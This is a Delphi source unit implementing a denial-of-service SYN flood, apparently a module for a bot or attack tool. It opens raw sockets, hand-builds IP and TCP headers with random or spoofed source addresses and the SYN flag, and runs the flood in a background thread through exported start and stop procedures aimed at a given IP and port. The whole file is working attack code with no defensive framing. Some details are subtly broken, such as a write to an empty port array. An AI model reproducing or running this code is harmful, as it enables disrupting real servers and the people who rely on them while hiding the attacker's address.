unit uSSYN;

interface

uses
  Windows, WinSock, uUtils;

procedure StopFloodSSYN;
procedure CreateFloodSSYN(IP :String; Port :Integer);

const
  Len = 40;

implementation

type
  TPorts = array of Word;
  TSynOptions = packed record
    Delay: Cardinal;
    DstPorts: TPorts;
    SockAddr: TSockAddrIn;
    Num: Cardinal;
    RandomSeek: Integer;
    Sended: Cardinal;
    Socket: TSocket;
    SpoofIP: Cardinal;
    SrcPorts: TPorts;
  end;

  WordArray = ^TWordArray;
  TWordArray = array [0..0] of Word;

  PIPhdr = ^TIPhdr;
  TIPhdr = packed record
    ip_verlen: Byte;
    ip_tos: Byte;
    ip_len: Word;
    ip_id: Word;
    ip_off: Word;
    ip_ttl: Byte;
    ip_p: Byte;
    ip_sum: Word;
    ip_src: Cardinal;
    ip_dst: Cardinal;
  end;

  PTCPhdr = ^TTCPhdr;
  TTCPhdr = packed record
    tcp_src   : Word;
    tcp_dst   : Word;
    tcp_seq   : Cardinal;
    tcp_ack   : Cardinal;
    tcp_off   : Byte;
    tcp_flags : Byte;
    tcp_win   : Word;
    tcp_sum   : Word;
    tcp_urp   : Word;
  end;

  Ppseudohdr_tcp = ^Tpseudohdr_tcp;
  Tpseudohdr_tcp = packed record
    saddr     : Cardinal;
    daddr     : Cardinal;
    zero      : Byte;
    protocol  : Byte;
    length    : Word;
    tcphdr    : TTCPhdr;
  end;

var
  ThreadID :THandle;
  ThreadH  :THandle;
  DosIp    :String;
  DosPort  :Integer;
  Buf: array [0..(Len - 1)] of Char;
  IPhdr: PIPhdr = @Buf[0];
  TCPhdr: PTCPhdr = @Buf[20];
  WSAData: TWSAData;
  UseDelay: Boolean;
  SynOpt: TSynOptions;
  LastUpdate: Cardinal = 0;

procedure CreateSocket;
begin
  SynOpt.Socket := Socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
  if SynOpt.Socket = INVALID_SOCKET then
  begin
    Halt(0);
  end;
  if SetSockOpt(SynOpt.Socket, IPPROTO_IP, 2, '1', 4) <> 0 then
  begin // if can't set the IP_HDRINCL option then exit
    Halt(0);
  end;
end;

function CheckSum(data: WordArray; size: Integer): Word;
var
  i, sum: Integer;
begin
  sum := 0;
  i := 0;
  while size > 1 do begin
    Inc(sum, data^[i]);
    Dec(size, 2);
    Inc(i);
  end;
  if size <> 0 then
    Inc(sum, data^[i]);
  sum := (sum shr 16) + (sum and $ffff);
  Inc(sum, sum shr 16);
  Result := not sum;
end;

function ValidPort(const Port: string): Boolean;
var
  prt: Integer;
begin
  prt := StrtoIntDef(Port, -1);
  Result := (prt > -1) and (prt < 65536); // a valid port must be between -1 and 65536
end;

function GetPorts(Ports: string): TPorts;

  procedure AddPort(const Port: string);
  begin
    if ValidPort(Port) then
    begin
      SetLength(Result, Length(Result) + 1);
      Result[High(Result)] := StrtoInt(Port);
    end
    else
      Writeln('Skipping invalid port: ' + Port);
  end;

var
  i: Integer;
  S: string;
begin
  i := Pos(',', Ports);
  while i > 0 do
  begin
    S := Copy(Ports, 1, i - 1);
    AddPort(S);
    Delete(Ports, 1, i);
    i := Pos(',', Ports);
  end;
  AddPort(Ports);
end;

function Resolve(const host: PChar): Cardinal; // function for resolving host to ip
var
  InAddr: TInAddr;
  HostEnt: PHostEnt;
begin
  InAddr.S_addr := inet_addr(host); // convert ip address format (ex: 127.0.0.1) to cardinal
  if InAddr.S_addr = INADDR_NONE then // if it is not a ip address then resolve it
  begin
    HostEnt := GetHostByName(host);
    if not Assigned(HostEnt) then // if couldn't resolve the host then exit
    begin
      Writeln('Error: Unable to resolve host: ' + host);
      Halt(0);
    end;
    Move((HostEnt^.h_addr_list^)^, InAddr.S_addr, HostEnt^.h_length);
  end;
  Result := InAddr.S_addr;
end;

function GetRandomValue(const Range: Integer): Integer; // function for getting different random
begin                                                   // values between very short times
  SynOpt.RandomSeek := (SynOpt.RandomSeek xor Range) + 1;
  Result := (Random(High(Integer)) xor SynOpt.RandomSeek) mod Range;
end;

function GetRandomIP: Cardinal;
var
  IPArray: array [0..3] of Byte;
  i: Integer;
begin
  for i := 0 to 3 do
    IPArray[i] := GetRandomValue(255) + 1;
  Move(IPArray, Result, Sizeof(Result));
end;

var
  SeudoBuf: array [0..31] of Char;

procedure SendSyn(const sport, dport: Word);

  procedure SendSyn_FillIPhdr;
  begin
    IPhdr.ip_verlen := $45;
    IPhdr.ip_tos := 0;
    IPhdr.ip_len := htons(Len);
    IPhdr.ip_id := GetRandomValue(High(Word)) + 1;
    IPhdr.ip_ttl := 255;
    IPhdr.ip_p := 6; // 6 = TCP
    if SynOpt.SpoofIP = 0 then
      IPhdr.ip_src := GetRandomIP
    else
      IPhdr.ip_src := SynOpt.SpoofIP;
    IPhdr.ip_dst := SynOpt.SockAddr.sin_addr.S_addr;
    IPhdr.ip_sum := CheckSum(@IPhdr^, 20);
  end;

  procedure SendSyn_FillTCPhdr;
  var
    PSeudohdr: Ppseudohdr_tcp;
  begin
    if sport = 0 then
      TCPhdr.tcp_src := GetRandomValue(High(Word)) + 1
    else
      TCPhdr.tcp_src := htons(sport);
    if dport = 0 then
      TCPhdr.tcp_dst := GetRandomValue(High(Word)) + 1
    else
      TCPhdr.tcp_dst := htons(dport);
    TCPhdr.tcp_seq := GetRandomValue(High(Integer)) + 1;
    TCPhdr.tcp_ack := GetRandomValue(High(Integer)) + 1;
    TCPhdr.tcp_flags := $02; // 0x02 = syn flag
     TCPhdr.tcp_win := GetRandomValue(High(Word)) + 1;
    TCPhdr.tcp_urp := GetRandomValue(High(Word)) + 1;
    FillChar(SeudoBuf, Sizeof(SeudoBuf), 0);
    PSeudohdr := Ppseudohdr_tcp(@SeudoBuf); // for a correct tcp checksum
    PSeudohdr.saddr := IPhdr.ip_src;        // we must calculate it with a pseudo header
    PSeudohdr.daddr := IPhdr.ip_dst;
    PSeudohdr.protocol := 6;
    PSeudohdr.length := htons(20);
    PSeudohdr.tcphdr := TCPhdr^;
    TCPhdr.tcp_sum := CheckSum(@PSeudohdr^, 32);
end;

begin
  FillChar(Buf, Len, 0);
  SendSyn_FillIPhdr;
  SendSyn_FillTCPhdr;
  Sendto(SynOpt.Socket, Buf, Len, 0, SynOpt.SockAddr, Sizeof(SynOpt.SockAddr));
end;

procedure SetDefaultOptions;
begin
  SynOpt.SockAddr.sin_addr.S_addr := Resolve(PChar(DosIp));
  SynOpt.SockAddr.sin_family := AF_INET;
  SynOpt.SockAddr.sin_port := GetRandomValue(High(Word)) + 1;
  SynOpt.Num := 200;
  SynOpt.SrcPorts[0] := 80;
  SynOpt.Delay := 40;
end;

function CanUpdate(const DelayValue: Cardinal; const Force: Boolean): Boolean;
begin
  Result := Force or ((GetTickCount - LastUpdate) >= DelayValue);
  if Result then LastUpdate := GetTickCount;
end;

procedure FloodSyn;
var
  j :Integer;
begin
  WSAStartUp($0101, WSAData);
  FillChar(SynOpt, Sizeof(SynOpt), 0);
  CreateSocket;
  try
    Randomize;
    SetDefaultOptions;
    UseDelay := SynOpt.Delay > 0;
    repeat
      for j := 0 to High(SynOpt.SrcPorts) do
      begin
        SendSyn(SynOpt.SrcPorts[j], DosPort);
        if UseDelay then
          Sleep(SynOpt.Delay);
      end;
      Inc(SynOpt.Sended);
      CanUpdate(50, SynOpt.Sended = SynOpt.Num);
    until
      SynOpt.Sended = SynOpt.Num;
  finally
    CloseSocket(SynOpt.Socket);
    WSACleanUp;
    SuspendThread(ThreadH);
  end;
  exit;
end;

procedure StopFloodSSYN;
begin
  SuspendThread(ThreadH);
end;

procedure CreateFloodSSYN(IP :String; Port :Integer);
begin
  DosIp := IP;
  DosPort := Port;
  ThreadH := CreateThread(nil,0,@FloodSyn,nil,0,ThreadID);
end;

end.
